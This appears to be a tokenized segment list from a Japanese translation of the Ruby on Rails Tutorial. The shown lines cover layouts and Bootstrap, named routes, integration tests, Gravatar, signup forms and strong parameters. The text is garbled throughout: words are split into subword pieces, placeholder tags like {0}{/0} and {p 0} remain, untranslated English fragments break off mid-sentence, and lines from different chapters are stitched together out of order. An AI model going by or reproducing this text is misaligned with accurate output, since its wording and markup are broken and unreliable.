▁ カスタム CSS 用の ファイル を作成し たら 、 リスト { p 0} のように {2} @ im port {/2} を使用して 、 Bootstrap ▁( と それ に 関連する Sprockets ) ▁ を インクルード します
▁ 導入 後 、 Web サーバ を 再 起動 させる と 、 アプリケーションに 反 映 させる ことができます ▁( { p 0} で紹介した ように 、 Ctrl - C を 押 して Web サーバ を 停 止 させ た 後 、 {2} rails ▁ server {/2} コマンド を 打 って Web サーバ を 起動 してください )。 うまく い け ば 図 \ ref { fig : sample _ app _ only _ bootstrap } のような 結果 に
▁{0} 図 5 . 4 {/0} ▁{1} スペース や 共通 スタイル を追加した 結果 {/1}
▁ 言 い 換 え ると 、\ ko de { . center } 冒 頭 の ドット \ ko de { . } は 、 この ルール が クラス に対して スタイル を 適 用 すること を 示 しています 。
▁{0} 図 5 . 6 {/0} {1} デザイン された ロ ゴ と サンプル アプリ {/1}
▁(\ ko de { shared } ディレクトリ は {1}{2} 第 7 章 {/2}{/1} で 作成 します )。
▁{0} 図 5 . 7 {/0} ▁{1} Home ページに footer を追加する {/1}
▁* = ▁require _ tree ▁ .
▁* = ▁require _ self
▁* = ▁require _ tree ▁ .
▁* = ▁require _ self
▁上の ように することで コードの 意味 が わかりやすく なり 、\ ko de { about _ path } の 定義 を 変え れば \ ko de { about _ path } が 使用されている すべての URL を変更 できる ため 、 柔 軟 性 が 高 まり ます 。
▁( {0}{1} 第 8 章 {/1}{/0} で 本 格 的に 実装します )。
▁{0} 表 ▁5 . 1 {/0} ▁{1} サイト リンク の ルート ▁( routing ) ▁ と URL の マッピング {/1}
▁まずは 、 {0}{1} 第 3 章 {/1}{/0} の 演習 で 取り上げ た Contact ページ について 追加 しましょう 。
▁ Contact ページ のテスト ▁( ▁\ failing ▁ { 5 }{/ 5 }) ▁ { 6 } test / controllers / static _ pages _ controller _ test . rb { / 6 }
▁ ルート URL のような ルーティング を定義する こと の 効果 は 、 ブラウザから アクセス し や す く すること だけ ではありません 。 それ 以外に も 、 生 の URL ではなく 名前付きルート を使って URL を参照 すること が できるようになります 。 w h i ch ▁is ▁to ▁create ▁name d ▁ routes ▁that ▁ allow ▁ us ▁to ▁ ref er ▁to ▁ routes ▁ by ▁a ▁name ▁ r at her ▁ th an ▁ by ▁the ▁ raw ▁ URL . ▁ In ▁this ▁ case , ▁the s e ▁ routes ▁are ▁\ ko de { root _ path } ▁and ▁\ ko de { root _ url } , ▁with ▁the ▁ only ▁ difference ▁be ing ▁that ▁the ▁ la tt er ▁ include s ▁the ▁ full ▁ URL :
▁なお 、\ emph { Rails チュートリアル } では 、\ ko de { _ path } 書 式 を使用する 一般的な 規 約 に従い 、 リダイレクト の場合 のみ \ ko de { _ url } 書 式 を使用します 。
▁また 、 ルート URL のとき と同様に 、\ ko de { help _ path } や \ ko de { help _ url } といった 名前付きルート も 使えるようになります 。
▁ 早 速 、\ ko de { link _ to } メソッドの 2 番目の 引数 で 、 適切な 名前付きルート を使って みましょう 。
▁これで 、 レイアウト に {0}{1} 第 3 章 {/1}{/0} で作成した すべての 静的ページ へのリンク が できました 。 たとえば \ href { http :// localhost :3000/ about }{/ about } の場合は About ページ ▁( 図 \ ref { fig : about _ page }) ▁ に移動し ます 。
▁{0} 図 5 . 8 {/0} ▁{1} \ href { http :// localhost :3000/ about }{/ about } で 表示される About ページ {/1}
▁まずは 、\ ko de { site _ layout } という テスト の テンプレート を生成する ところ から 始 め て み ます 。
▁このとき 、 Rails は 与えられた ファイル名 の 末尾 に ▁\ ko de { _ test } ▁という 文字列 を追加する ことに注目してください 。
▁Rails の 統合テスト では 、 上の ステップ を コード に 落 と し 込 んで い く ことになります ▁( リスト \ ref { code : layout _ links _ test })。 具体的には 、 まず \ ko de { assert _ template } メソッドを使って 、 Home ページ が 正しい ビュー を 描画 している かどうか 確かめ ます
▁リスト \ ref { code : layout _ links _ test } では 、\ ko de { assert _ select } メソッドの 高度な オプション を使っています ▁( このメソッド 自体 は リスト \ ref { code : title _ tests } や リスト \ ref { code : contact _ page _ test } でも 登 場 しました )。
▁上のコードでは 、 Rails は自動的に は て な マーク ▁" ? " ▁ を \ ko de { about _ path } に 置 換 しています ▁( このとき ▁" about _ path " ▁ 内に 特 殊 記 号 があれば エスケープ 処理 されます )。 これにより 、 次のような HTML がある かどうかを チェック することができます 。
▁\ ko de { assert _ select } には 色 々 な 指定 の 仕 方 があります 。 その 代 表 例 を いくつか 表 \ ref { table : assert _ select } で 紹 介 します 。
▁\ ko de { assert _ select } の いくつかの 使用 例
▁ 統合テスト が 成功 した ら 、 今度は すべての テストを 流 して {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} する かどうか 確かめ て みてください 。
▁これは 、 Web サイト で ユーザー登録 を 行える ように するための 最初の 重要な 一 歩 となります 。 次の 一 歩 である ユーザーの モデリング は {0}{1} 第 6 章 {/1}{/0} で 行 い 、 {2} {1} 第 7 章 {/1} {/2} で ユーザー登録 が 完成 します 。
▁User ページ 用の 最初の テスト ▁( {2}{3}{/3}{3}{4} g re en {/4}{/3}{3}{/3} {/2} )
▁ 他の ルート と同様 、\ ko de { get ▁ ’ / signup ’ } と 記述 した ことで \ ko de { signup _ path } という 名前付きルート が でき 、 それ を リスト \ ref { code : home _ page _ signup _ link } で 使用します 。
▁これで 、 少なくとも サインイン の ルート を追加する まで の 間 、 リンク と 名前付きルート が 完成 しました ( {0}{1} 第 8 章 {/1}{/0} )。
▁{0} 図 5 .9{/0} ▁{1} \ href { http :// localhost :3000/ signup }{/ signup } で 表示される 新しい ユーザー登録ページ {/1}
▁リスト { p 0} で お 見 せ した ように 、 Application ヘルパー で 使っている {2} full _ title {/2} ヘルパー を 、 test 環境で も 使えるように すると 便利です 。
▁ この問題 を 解決 するために は 、\ ko de { full _ title } ヘルパー に対する テストを書く 必要があります 。 そのため に 、 Application ヘルパー をテストする ファイル を作成し 、 リスト \ ref { code : full _ title _ helper _ tests } の \ ko de { F I L L _ IN } のような コードを 書い てみましょう 。
▁ ヒント : ▁リスト \ ref { code : full _ title _ helper _ tests } では \ ko de { assert _ equ al ▁< 期 待 される 値 > , ▁< 実際の 値 > } といった 形 で 使って い ましたが 、 内部で は \ ko de { = = } 演算子 を使って 、 期 待 される 値 と 実際の 値を 比 較 して 正しい かどうか テスト しています 。
▁ テスト 環境で \ ko de { full _ title } ヘルパー を使う ▁( {3} { 4 } {/4} { 4 } { 5 } g re en { / 5 } {/4} { 4 } {/4} {/3}
▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 一 貫 した Web 開発 技 法 を学ぶ ために ▁3 ▁ つの サンプルアプリケーション を 作り ます 。 \ emph { hello } アプリ ▁(\ ref { sec : the _ hello _ application }) 、 もう少し だけ 複雑な \ emph { toy } アプリ ▁( {3} 第 {2} 2 {/2} 章 {/3} ) 、 実 践 的な \ emph { sample } アプリ ▁( { 4 } 第 {2} 3 {/2} 章 {/4} から { 5 } 第 {2} 12 {/2} 章 { / 5 } まで ) ▁ です 。
▁次に \ ko de { hello _ app } という Rails アプリ の最初の サンプル 作成 に 取り か か ります 。
▁ 第 1 章 の最後 には 、 作成した アプリ を 早 々 に 本番 ▁( production ) ▁ 環境 ▁( { p 0} ) ▁ に {2} デプロイ して 一 般 公開 する {/2} ところ まで 実 践 します 。
▁{0}{1} 第 2 章 {/1}{/0} では 、 Rails アプリケーションの 基本的な 仕組み を 体 験 するために 、 別の プロジェクト を作成します 。
▁ 第 3 章 以降 では 、 いよいよ 本 格 的な 大 規 模 \ emph { サンプルアプリケーション } ▁(\ ko de { sample _ app } ▁ ) を 開発 します 。 自動生成 コードは 使 わ ずに 、 ゼ ロ から コードを 書き 進め ます 。
▁ サンプルアプリケーションの 開発 では 、「 モックアップ 」 「 テスト駆動開発 ▁( T D D )」 「 統合テスト 」 の 3 つの 手法 を 採 り 入 れ ます 。 \ emph { } \ emph { } \ emph { }
▁{0} 第 {1} 3 {/1} 章 {/0} では 静的なページ を作成し 、 そこ に 動的な 要素 を 順 次 追加 していきます 。
▁ 次の {0}{1} 第 4 章 {/1}{/0} では 少し 回 り 道 を し 、 Rails を 支 え ている Ruby という 言語 について 簡単に 学 び ます 。
▁{0} 第 {1} 5 {/1} 章 {/0} から {2} 第 {1} 10 {/1} 章 {/2} に かけ て 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システム を 順に 作成 し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 より 実 践 的な 知 識 を 身 に つ け るために 、 S ca f fold と ほぼ 逆 の ア プロ ー チ で 開発 を 進め ていきます 。 具体的には 、 {1}{2} 第 2 章 {/2}{/1} で 作成する 簡単な デ モ アプリ では scaffold を使います が 、\ emph { この チュートリアル } の 中 核 である {3} {2} 第 3 章 以降 {/2} {/3} の サンプルアプリケーション から は 、 scaffold を 一 切 使 わ ずに 開発 を 進め ていきます 。
▁ 簡 素 化 の ため 、 次のような Unix スタイル の プロンプト ▁( 行 の 頭 に 「 $ 」 を表示する スタイル ) ▁ を使用して 、 その 例 が コマンドライン であることを 示 しています 。
▁ 多 少 苦 労 しても 構 わ ないので ローカル P C 環境で \ emph { Ruby ▁on ▁Rails チュートリアル } を 学習 したい と お 考え の 方 には 、\ href { http :// install rails . com /}{ In st all Rails . com } { p 2 } に従って 環境 を 構 築 する ことをお勧めします 。 [ N I W A T A K O _ TIP S ]
▁ 図 \ ref { fig : c lo u d 9 _ new _ w or k space } に示したように 、「 rails - tutorial 」( 「 rails _ tutorial 」 に \ emph { しない } よう ご注意ください ) ▁という ワ ー ク スペース 名を 入力 し 、[ P ri v at e ▁to ▁the ▁ people ▁I ▁in v it e ] ▁ を 選択 し 、 Rails チュートリアル の ア イ コ ン ▁( Ruby ▁on ▁Rails の ア イ コ ン では \ emph { ありません }) ▁ を設定します 。
▁ { p 0} で 推 奨 している Cloud 9 ▁ IDE を {2} 利用 しない {/2} 場合は 、 Rails プロジェクト で使用する ための \ ko de { w or k space } ディレクトリ を作成して おいてください ▁( リスト ▁\ ref { code : m k d ir _ rails _ projects })。 ▁ directory ▁for ▁your ▁Rails ▁ projects ▁if ▁it ▁do es n ’ t ▁ al read y ▁ ex ist ▁and ▁the n ▁ change ▁in to ▁the ▁ directory .
▁{0}{1} リスト 1 .3{/1}{/0} の 下 の 方 にご注目ください 。 \ ko de { rails ▁ new } を実行すると 、 ファイル の作成 後に \ ko de { bundle ▁install } コマンド が自動的に 実行 されています 。
▁Web アプリケーションの ディレクトリ を どう 構成 するか は 本 来 自 由 な のですが 、 Rails のような Web フレームワーク では ディレクトリ と ファイルの 構造 ▁( {0}{1} 図 1 . 4 {/1}{/0} ) ▁ はこの ように 標準 化 されています 。 その おかげで 、 ディレクトリ 構成 に 悩 む こと なく 、 実際に 動作する アプリケーションを 即 座 に ゼ ロ から 作成 できる のです 。
▁Rails が デフォルトで 作成する ファイル については {0}{1} 表 1 . 2 {/1}{/0} を参照してください 。 これらの ファイル や ディレクトリ の 目的 については 本チュートリアル 全体 に 渡 って 説明 いた します 。
▁{0} 図 1 . 4 ▁{/0}{1} 新規作成 された Rails アプリケーションの ディレクトリ 構造 {/1}
▁{0} 表 1 . 2 : ▁ {/0} ▁{1} デフォルトの Rails フォルダ 構造 まとめ 。 {/1}
▁ Gemfile の内容 は Ruby のコード ですが 、 ここでは 文法 を 気 に する必要はありません 。 Ruby の詳細については {0}{1} 第 4 章 {/1}{/0} で説明します 。
▁\ ko de { hello _ app } ディレクトリ にある デフォルトの \ ko de { Gemfile } 。
▁ { p 0} の {2} rails ▁ new {/2} コマンド と \ ref { sec : the _ hello _ application } の {2} bundle ▁install {/2} コマンド を実行し た ことにより 、 実際に 動か す こと の できる アプリケーション が作成され ました 。
▁ まだ 始 ま った ば か り ですが 、 今 のうち に Rails アプリケーションの 全体 的な 仕組み を 知 っ ておく ことは 後 々 役 立 ち ます ▁( {0}{1} 図 1 . 11 {/1}{/0} )。
▁ デフォルトの Rails アプリ 構造 ▁( {0}{1} 図 1 . 4 {/1}{/0} ) ▁ を 眺 め てみると 、\ ko de { app / } という ディレクトリ があり 、 その 中に 「\ ko de { models }」 「\ ko de { views }」 「\ ko de { controllers }」 という 3 つの サブディレクトリ がある ことに 気 付 いた 方 も いる と思います 。
▁{0} F ig ur e ▁1. 11 : ▁{/0}{1} A ▁ s ch e ma tic ▁ re present ation ▁of ▁the ▁ model - view - controller ▁( MVC ) ▁ ar ch it e ct ur e . {/1}
▁ 新しい コントローラの 作成 は { 0} 第 {1} 2 {/1} 章 {/0} で 行います 。
▁ この時点で は Ruby の 文法 については 気 に する必要はありません 。 { 0} 第 {1} 4 {/1} 章 {/0} で 詳 しく 解説します 。
▁ Application コントローラに \ ko de { hello } を追加する 。 {3} {/3} { 4 } app / controllers / application _ controller . rb {/4}
▁ ルート ルーティング を有効に するには 、「 # 」 文字 を削除し て コメント を 解 除 し 、 コードを 書き 換 え ます ▁( リスト \ ref { code : hello _ root _ route })。 これにより 、 Rails の ルート ルーティング にアクセス すると Application コントローラの \ ko de { hello } アクション が 動作します
▁ ルート ルーティング を設定する 。 {2} {/2} {3} config / routes . rb {/3}
▁ チュートリアル 本 編 では この ファイル を修正する ことはありません が 、 { p 0} に {2} . gitignore {/2} ファイル への 追加 例 があります 。 これは 、\ ref { sec : advance d _ testing _ setup } で 行う オプション の詳細 テスト 設定 の一部 です 。
▁( { p 0} で {2} co {/2} エイリアス を 設定 した 場合は 、 {2} git ▁ co ▁- b ▁ mod if y - README {/2} と 入力 することもできます )。
▁続いて 、 リスト { p 0} の内容 を {2} README . m d {/2} に 入力 します 。
▁{0} 図 1 . 17 ▁{/0}{1} M ar k d own d で フォーマット された 改良 版 \ ko de { README } ファイル {/1}
▁\ ko de { bundle ▁install } に 特殊な フラグ 「 - - with out ▁ production 」 を追加する と 、 本番 用の gem ▁( この場合は \ text tt { p g } と \ text tt { rails _ 12 factor }) ▁ は ローカル の 環境 には インストール されません 。
▁最初に \ href { http :// signup . heroku . com /}{ Heroku で ユーザー登録 } します 。
▁ デプロイ された アプリケーションの 表示 は 、\ ko de { heroku ▁create } ▁( {1} リスト 1 . 15 {/1} ) ▁ を実行し た 際に 生成された アドレス を ブラウザで 開 く だけです ▁( もちろん ここに 表示 されている 著者 の アドレス ではなく 、 {2} {/2} あなた の アドレス を使って ください )。
▁ 次の 章では 、 この { 0} 第 {1} 1 {/1} 章 {/0} で 学 んだ ことを 基 礎 として 、 データベース を 備 え た \ emph { toy アプリ } を 製 作 し 、 Rails で どんな ことができる か を さらに 詳 しく 学 び ます 。
▁リスト { p 0} の {2} hello {/2} アクション を 書き 換 え 、「 h ol a , ▁ m un do ! 」 と 表示される ように してみましょう
▁\ emph { 追加 情報 } : ▁Rails の 表示 では 「 非 \ href { http :// es . w ikipedia . org / wiki / A S C I I } { A S C I I } 文字 」 も サポート されています 。 「 ¡ H ol a , ▁ m un do ! 」 には ス ペ イン 語 特 有 の 逆 さ 感 嘆 符 「 ¡ 」 が 含まれています 。
▁リスト { p 0} の {2} hello {/2} アクション を 複 製 して 、 第 2 の アクション {2} g oo d by e {/2} を追加しましょう 。 この アクション は 、「 g oo d by e , ▁ world ! 」 という テキスト を表示します 。
▁{0}{1} 第 2 章 {/1}{/0} で 簡 易 的な マイクロポスト 投 稿 フォーム に 触 れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記述 した Micropost データモデル を作成し 、 User モデルと \ ko de { has _ many } および \ ko de { belongs _ to } メソッドを使って 関連付け を行い 、 さらに 、 結果を 処理 し 表示 するために 必要な フォーム と その 部品 を作成します ▁(\ ref { sec : micropost _ images } で 画像 の アップロード も 実装します )。
▁{0}{1} 第 12 章 {/1}{/0} では 、 マイクロポストの \ emph { フィード } を 受け 取 るために 、 ユーザーを \ emph { フォロー } する という 概念 を導入し 、 Twitter の ミ ニ ク ロー ン を 完成 させ ます 。
▁{0} String {/0} 型 でも 2 5 5 文字 まで は 格 納 できる ため 、 この 型 でも { p 1 } で 実装 する 14 0 文字 制限 を 満 た せる のですが 、 { 0} T ext {/0} 型 の 方が 表現 豊 か な マイクロポストを 実現 できます 。
▁これにより 、 モデルの テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} する ようになります 。
▁ Micropost モデルの 方 では 、 { 0} belongs _ to ▁: user {/0} という コードが 必要 になる のですが 、 これは ▁リスト { p 1 } の マイグレーション によって自動的に 生成 されている はずです ▁( リスト \ ref { code : micropost _ belongs _ to _ user })。
▁もちろん 、 些 細 な リファクタリング で しか ないので 、 テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} した ま ま になっている はずです 。
▁ そして 、 アプリケーション 側 のコードは 実装 済み なので 、 これらの テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁この節では 、\ emph { ステータスフィード } ▁( {1}{2} 第 12 章 {/2}{/1} で 完成 させ ます ) ▁ の最初の ヒント を お 見 せ します 。
▁{0}{1} 第 7 章 {/1}{/0} では 、 HTTP ▁\ text tt { POST } リクエストを Users コントローラの \ ko de { create } アクションに 発行する HTML フォーム を作成する ことで 、 ユーザーの サインアップ を 実装 しました 。
▁これで 、 すべての テストが {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁これらの 追加 的な チェック 機能を まとめ ると 、 リスト \ ref { code : jquery _ file _ test } のようになります 。
▁{0}{1} 第 12 章 {/1}{/0} では 、 そのような ユーザー 同士 の関係 ▁( リレーションシップ ) ▁ を モデリング する方法 を 学 び 、 それ が マイクロポストの フィード に どのように 関連する か を 学 び ます 。
▁ { p 0} では HTML {2} フォーム {/2} を使用して 登録 情報を Web アプリケーションに 送信 します 。 続いて \ ref { sec : success f ul _ signup s } では ユーザーを 新規作成 して 情報を データベースに保存 します 。
▁ 本 章では 、 {0}{1} 第 6 章 {/1}{/0} で作成した User モデル のバリデーション を 信 頼 し 、 有効な メールアドレスを 持 っている ▁( 可能性 のある ) ▁ 新規ユーザー を 増 や していきます 。
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレス が \ emph { 本当に } 有効 であることを 確かめ るために 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁ユーザー プロファイル ページの 最終的な 目 標 は 、 図 \ ref { fig : profile _ mockup } のように { p 2 } ユーザーの プロファイル 写 真 と 基本 ユーザー データ 、 そして マイクロポストの 一覧 を表示する ことです 。
▁この ページ を作成し たら 、 {0}{1} 第 12 章 {/1}{/0} の サンプル ・ アプリケーション で使用する 予定です 。
▁{0} 図 7 . 1 {/0} ▁{1} この節 で 作成する ユーザー プロファイル のモックアップ {/1}
▁{0} 図 7 .2{/0} ▁{1} 理 想 と する 最終的な プロファイル ページのモックアップ {/1}
▁上の ように 、 Rails には \ text tt { Rails } という オブジェクト があり 、 それ には 環境 の 論理値 ▁( boolean ) ▁ を 取 る \ text tt { env } という 属性 があります 。 たとえば 、\ text tt { Rails . env . test ?} は テスト 環境で は \ text tt { true } を返し 、 それ以外の 環境で は \ text tt { false } を返します 。
▁ デバッグ 出力 を き れ い に 整 形 するために 、 {0}{1} 第 5 章 {/1}{/0} で作成した カスタム スタイルシート を リスト { p 1 } の よう に追加します 。
▁ここで Sass の \ emph { ミ ッ ク ス イン } 機能 ▁( ここでは \ ko de { box _ s i z ing }) ▁ を使用しています 。
▁{0} 図 7 . 3 {/0} ▁{1} サンプルアプリケーションの Home ページに デバッグ情報 を表示する {/1}
▁この 行 に対応する URL 、 アクション 、 名前付きルート は {0}{1} 表 7 . 1 {/1}{/0} のようになります
▁{0} 表 7 . 1 {/0} ▁{1} リスト \ ref { code : users _ resource } の Users リソース が提供する RESTful な ルート {/1}
▁{0} 図 7 . 5 {/0} ▁{1} URL ▁ / users /1 ▁ の ルーティング は 有効 だ が ページ がない 状態 {/1}
▁id = { 0} 1 {/0} の ユーザーを 検索 できた のは 以上 の 仕組み による ものです ▁( リスト { p 1 })。
▁{0} 図 7 . 6 {/0} ▁{1} Users リソース 追加 後 の の ユーザー表示ページ {/1}
▁ここでは 、 リスト { p 0} のように {2} gravatar _ for {/2} ヘルパーメソッド を使用して Gravatar の 画像 を 利用 できるようにします 。
▁ デフォルトで は 、 ヘルパー ファイル で 定義されている メソッドは 自動的に すべての ビューで 利用 できます 。 ここでは 、 利 便 性 を 考え て \ ko de { gravatar _ for } を Users コントローラに 関連付けられている ヘルパー ファイル に置く ことにしましょう 。
▁( 本チュートリアルで は 、 リスト \ ref { code : email _ downcase } の コールバック 処理 で 小文字 変 換 された メールアドレスを 利用 している ため 、 ここで 小文字 変 換 を 入 れ なくても 結果 は 同じです 。 ただし 、 将来 \ ko de { gravatar _ for } メソッドが 別の 場所 から 呼 び だ される 可能性 を 考え ると 、 ここで 小文字 変 換 を 入 れ ること には 意 義 があります 。 )
▁\ ko de { gravatar _ for } ヘルパー を 組 み 込 んだ 結果を リスト \ ref { code : gravatar _ for _ helper } に 示 しました 。
▁\ ko de { gravatar _ for } ヘルパーメソッド を定義する
▁{0} 図 7 . 7 {/0} ▁{1} ユーザー表示ページ に Gravatar の デフォルト 画像 が表示されている {/1}
▁リスト \ ref { code : s id e bar _ css } では \ ko de { . gravatar _ edit } という CSS クラス を追加し ています 。 これは {3} {1} 第 9 章 {/1} {/3} でも 使われ ます 。
▁{0} 図 7 . 10 {/0} ▁{1} 現 状 の ユーザー登録ページ ▁\ href { http :// localhost :3000/ signup }{/ signup }{/1}
▁{0} 図 7 . 11 {/0} ▁{1} ユーザー登録 ページのモックアップ {/1}
▁これ を行う には 、 Rails で \ ko de { form _ for } ヘルパーメソッド を使用します 。 このメソッドは Active ▁Record オブジェクトを 取り 込 み 、 オブジェクトの 属性 を使用して フォーム を 構成 します 。
▁ ユーザー登録ページ ▁ / signup ▁ の ルーティング は 、 Users コントローラ ー の \ ko de { new } アクションに 既に 紐 付け られ ている ことを思い出してください ▁( リスト \ ref { code : signup _ route })。 したがって 、 次の ステップ は 、 ▁\ ko de { form _ for } の 引数 で 必要となる User オブジェクト を作成する ことになります
▁\ ko de { box _ s i z ing } ミ ッ ク ス イン を リスト \ ref { code : m i x in _ and _ debug } から 再 利用 し ていることに注目してください 。
▁まずは 、 埋め込み Ruby が 使われ ている \ ko de { form _ for } から \ ko de { end } まで の 外 側 の 構造 を 読み 解 い ていきます 。
▁\ ko de { do } キーワード は 、 ▁\ ko de { form _ for } が 1 つの 変数 を持つ ブロック を 取 ること を表し ます 。 この 変数 \ ko de { f } は ▁“ form ” ▁ の f です 。
▁{0} 図 7 . 1 3 {/0} ▁{1} \ ko de { text } フィールド と \ ko de { password } フィールド に 文字 を 入力 した 状態 {/1}
▁ 動作 の詳細 を 知りたい 場合は 、 S t ack ▁ O ver flow の \ href { http :// st ack o ver flow . com / que st ions / 9 4 1 59 4 / u nder st and - rails - a u the n tic ity - token } { } Rails 信 頼 性 トークン 関連 の 書き 込 み { / 0 ▁( 英語 ) ▁ を参照してください 。
▁{0} 図 7 . 14 {/0} ▁{1} ユーザー登録 が 失敗した とき のモックアップ 。 { {/1}
▁この リスト では 、 { p 0} の 「 パーシャル 」 の ところで も 使 った {2} render {/2} メソッドを 再度 使い ま わ しています 。 {2} render {2} {/2} {/2} は コントローラのアクション の中で も 正常に動作し ます 。
▁{0} 図 7 . 15 {/0} ▁{1} ユーザー登録 失敗 {/1}
▁{0} 図 7 . 16 {/0} ▁{1} ユーザー登録 失敗 時の デバッグ情報 {/1}
▁この ハッシュ は Users コントローラに \ ko de { params } として 渡 さ {1} {/1} れ ます 。 {2} 7 . 1 . 2 {/2} で説明した とおり 、 この \ ko de { params } ハッシュ {1} {/1} には 各 リクエスト の 情報 が 含まれています 。
▁ 以前の バージョンの Rails では 、\ ko de { モデル } 層 で \ emph { attr _ access i b le } メソッド を使用することで 上 のような 危 険 を 防止 していました が 、 ▁Rails ▁4.0 では コントローラ 層 で \ emph { S trong ▁Parameters } という テクニック を使用すること が 推 奨 されています 。
▁これらの パラメータ を 使い や す く するために 、\ ko de { user _ params } という 外部 メソッド を使用する の が 慣習 になっています 。 このメソッドは 適切に 初期化 した ハッシュ を返し 、\ ko de { params [: user ]} の 代 わ り として 使用されます 。
▁この \ ko de { user _ params } メソッドは Users コントローラの 内部で のみ 実行 され 、 Web 経由で 外部 ユーザーに さ ら される 必要 は ない ため 、 リスト { p 1 } に 示す ように Ruby の \ ko de { private } キーワード を使って {3} 外部 から 使用 できない {/3} ようにします
▁ ちなみに 、\ ko de { private } キーワード 以降 の コードを 強 調 するために 、\ ko de { user _ params } の インデント を 1 段 深 く して あります 。
▁ { p 0} で 少し 触 れ た {2} errors . full _ messages {/2} オブジェクトは 、 ▁ エラーメッセージ の配列 を 持 っています 。
▁この メッセージ を ブラウザで 表示する には 、 ユーザーの \ ko de { new } ページ で エラーメッセージ の パーシャル ▁( partial ) ▁ を 出力 します 。 このとき 、\ ko de { form - control } という CSS クラス も 一 緒 に追加する ことで 、 Bootstrap が うまく 取り 扱 っ てくれる ようになります 。 変更 の 結果を {1} リスト {2} 7 . 18 {/2} に示します 。 {/1}
▁ここでは 、\ ko de { ’ shared / error _ messages ’ } という パーシャル を \ ko de { render } ▁( レンダリング ) ▁ して いる点に注目してください 。 これは Rails 全 般 の 慣習 で 、 パーシャル は 複数の コントローラに わ た る ビュー に 対 し 、 専 用の \ ko de { shared / } ディレクトリ を使用する ようにしています
▁ { p 0} では 文字列 に対して {2} empty ? {/2} メソッド を使用し ましたが 、 Rails の エラー オブジェクト に対して も 使用できます 。 オブジェクトが 空 の場合は {2} true {/2} 、 ▁ それ以外の 場合は {2} false {/2} を返します 。
▁さらに Rails は 、 無効な 内容 で 送信 が されて 元の ページに 戻 される と 、\ ko de { div } で 囲 まれ た エラー 用の CSS クラス \ ko de { field _ with _ errors } を返します 。
▁これらの メッセージ は モデルの 検証 時に 生成される ので 、 メールアドレス の スタイル や パスワード の 最 小 文字列 など を変更する と 、 メッセージ も 自動的に 変更 されます 。 [ B R ] < n > [ B R ] < n > ( このとき 、 存在性 のバリデーション も has _ secure _ password による バリデーション も 空 の パスワードを 検 知 してしまう ため 、 ユーザー登録フォーム で 空 の パスワード を入力する と 2 つの 同じ エラーメッセージ が表示され てしまいます 。 もちろん こういった 冗 長 な エラーメッセージ を直接 修正 すること も 可能です が 、 幸 運 にも 今回の 場合は 、 後 ほど 追加 する ▁ allow _ nil : ▁true ▁という オプション で この問題 は 解決 できます 。 )
▁{0} 図 7 . 17 {/0} ▁{1} ユーザー登録 失敗 時の エラーメッセージ {/1}
▁まずは 、 新規ユーザー 登録 用の 統合テスト を生成する ところ から 始 め ていきます 。 コントローラ ー の 慣習 である 「 リソース 名 は 複数形 」 に 因 んで 、 統合テスト の ファイル名 は \ ko de { users _ signup } とします 。
▁ { p 0} の 冒 頭 で データベース を リセット して あるので 、 現時点では {2} User . count {/2} は {2} 0 {/2} になっています 。
▁\ ref { sec : layout _ link _ tests } のように 、 ▁\ ko de { assert _ select } を使って 関連 ページの HTML 要素 を テスト していきます 。 これにより 、 今後 う っかり 要素 を変更 して し ま って も 気 付け る ようになります 。
▁ フォーム 送信 をテストする ためには 、 ▁\ text tt { users _ path } に対して \ ko de { POST } リクエストを 送信 する必要があります ▁( 表 \ ref { table : RESTful _ users })。 これは 、 次のように \ text tt { post } 関数 を使って 実現 できます
▁これらの コードは 等 価 では あります が 、\ ko de { assert _ no _ difference } を使う 方が 明 瞭 で 、 Ruby の 慣習 的に も 正しい です 。
▁なお 、 送信 に 失敗した ときに \ ko de { new } アクション が 再 描画 される は ず なので 、\ ko de { assert _ template } を使った テスト も 含 め ている ことに注意してください 。
▁ 無効な ユーザー登録 に対するテスト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁{0} 図 7 . 19 {/0} ▁{1} ユーザー登録 に 成功 した 画面 のモックアップ {/1}
▁ 実際の アプリケーション コードをリスト { p 0} に示します ▁( {2} redirect _ to {/2} メソッド に 注目してください )。
▁これは Rails が 、\ ko de { redirect _ to ▁@ user } という コード から \ ko de { user _ url (@ user ) } といった コードを 実行 したい ことを ( 自動的に ) 推 察 してくれ た 結果 になります 。
▁ も し メールアドレス が 既に 使用されている という メッセージ が表示され たら 、 { p 0} で や った ように Rake の {2} db : migrate : reset {/2} を実行して データベース を リセット してください 。
▁{0} 図 7 . 22 {/0} ▁{1} ユーザー登録 が 成功 し 、 フラッシュメッセージ が表示される {/1}
▁{0} 図 7 . 23 {/0} ▁{1} ブラウザで ページを 再 読み込み すると 、 フラッシュメッセージ が表示され な くなる {/1}
▁ 今回は \ ko de { assert _ difference } という メソッドを使って テストを 書き ます 。
▁リスト { p 0} と同じ ファイルに {2} assert _ difference {/2} を使った テスト を追加する と 、 リスト \ ref { code : a _ test _ for _ valid _ submission } のようになります 。
▁ここで 、 users _ path に POST リクエストを 送信 するために 、\ ko de { post _ v i a _ redirect } という メソッドを使って いる ことに注目してください 。
▁ 有効な ユーザー登録 に対するテスト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁{0}{1} 第 3 章 {/1}{/0} から デプロイ を して 来 ましたが 、 実際に データを \ emph { 操作 できるように する } デプロイ は 初めて です 。 そこで 、 この 機 会 に プロ レベル の デプロイ 方法 について説明し ていきます 。
▁ 今回は ユーザー登録ページ の ため だけ に SSL を導入し ます が 、 これは Web サイト 全体 で 適 用 できる ため 、 {0}{1} 第 8 章 {/1}{/0} で 実装 する ログイン 機 構 を セキュア に したり 、 { p 2 } で 説明 する {3} セッション ハイジャック {/3} の 脆弱性 に対して も 多くの 利 点 を 生 み 出 します 。
